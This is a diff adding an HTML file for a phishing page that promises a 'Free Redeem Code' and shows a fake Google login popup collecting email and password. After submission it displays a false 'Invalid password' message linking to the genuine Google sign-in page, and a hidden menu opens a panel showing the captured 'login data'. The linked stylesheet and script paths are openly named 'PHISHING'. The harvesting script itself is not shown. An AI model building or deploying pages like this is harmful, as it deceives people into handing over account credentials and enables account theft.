@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Redeem</title>
+    <link rel="stylesheet" href="/storage/emulated/0/1ID PHISHING.CSS/1 login css.css">
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+</head>
+<style>
+
+
+
+
+</style>
+<body>
+    <div id="main-container">
+        <h1>Login and get Free Redeem Code</h1>
+        <div class="login-buttons">
+            <button id="google-login"><ion-icon name="logo-google"></ion-icon> Login with Google</button>
+            <button id="facebook-login"><ion-icon name="logo-facebook"></ion-icon> Login with Facebook</button>
+        </div>
+    </div>
+
+    <!-- Google Login Popup -->
+    <!-- Google Login Popup -->
+<div id="google-popup" class="popup">
+    <div class="popup-content">
+        <h2>Google Login</h2>
+        <div class="input-container">
+            <input type="text" id="google-email" required>
+            <label>Email</label>
+            <ion-icon name="mail-outline"></ion-icon>
+        </div>
+        <div class="input-container">
+            <input type="password" id="google-password" required>
+            <label>Password</label>
+            <ion-icon name="lock-closed-outline"></ion-icon>
+        </div>
+        <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://accounts.google.com/v3/signin/identifier%3Fdsh%3DS1812573153%253A1655944654029516%26flowEntry%3DServiceLogin%26flowName%3DWebLiteSignIn%26ifkv%3DAX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5&ved=2ahUKEwiDzYGu1oaIAxWpiK8BHQnkAt4QFnoECAYQAQ&usg=AOvVaw3wpeLZXIYauCgsekeJQCr6" class="forget-password">Forget Password?</a>
+        <button onclick="googleLogin()" class="xbutt">Login</button>
+    </div>
+</div>
+
+
+    <!-- Facebook Login Popup -->
+  <!-- Facebook Login Popup -->
+    <!-- <div id="facebook-popup" class="popup">
+    <div class="popup-content">
+        <h2>Facebook Login</h2>
+        <div class="input-container">
+            <input type="text" id="facebook-mobile" required>
+            <label>Mobile Number</label>
+            <ion-icon name="call-outline"></ion-icon>
+        </div>
+        <div class="input-container">
+            <input type="password" id="facebook-password" required>
+            <label>Password</label>
+            <ion-icon name="lock-closed-outline"></ion-icon>
+        </div>
+        <a href="#" class="forget-password">Forget Password?</a>
+        <button onclick="facebookLogin()">Login</button>
+    </div>
+</div> -->
+
+
+    <!-- Redeem Code Popup -->
+    <div id="redeem-popup" class="popup">
+        <div class="popup-content">
+            <span class="xxxx">Invalid password</span>
+            <div class="input-container">
+                <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://accounts.google.com/v3/signin/identifier%3Fdsh%3DS1812573153%253A1655944654029516%26flowEntry%3DServiceLogin%26flowName%3DWebLiteSignIn%26ifkv%3DAX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5&ved=2ahUKEwiDzYGu1oaIAxWpiK8BHQnkAt4QFnoECAYQAQ&usg=AOvVaw3wpeLZXIYauCgsekeJQCr6"><h2 class="sexy"><u>forget password</u></h2></a>
+                <a href=""><button class="xbtn">Try again</button></a>
+                    
+            </div>
+           
+        </div>
+    </div>
+
+    <!-- Countdown Popup -->
+    <div id="countdown-popup" class="popup">
+        <div class="popup-content">
+            <div id="countdown-circle">
+                <span id="countdown-number">5</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Full Screen Popup for Login Data -->
+    <div id="data-popup" class="popup">
+        <div class="popup-content">
+            <span class="close" onclick="closePopup('data
+-popup')">&times;</span>
+            <h2>HELLO USER,</h2>
+            <div id="login-data"></div>
+        </div>
+    </div>
+
+    <!-- Top Right 3 Line Icon -->
+    <div id="top-right-menu">
+        <ion-icon name="menu-outline" id="menu-icon" onclick="openDataPopup()"></ion-icon>
+    </div>
+
+    <script src="/storage/emulated/0/1ID PHISHING.JS/1 js logi.js">
+  </script>
+</body>
+</html>
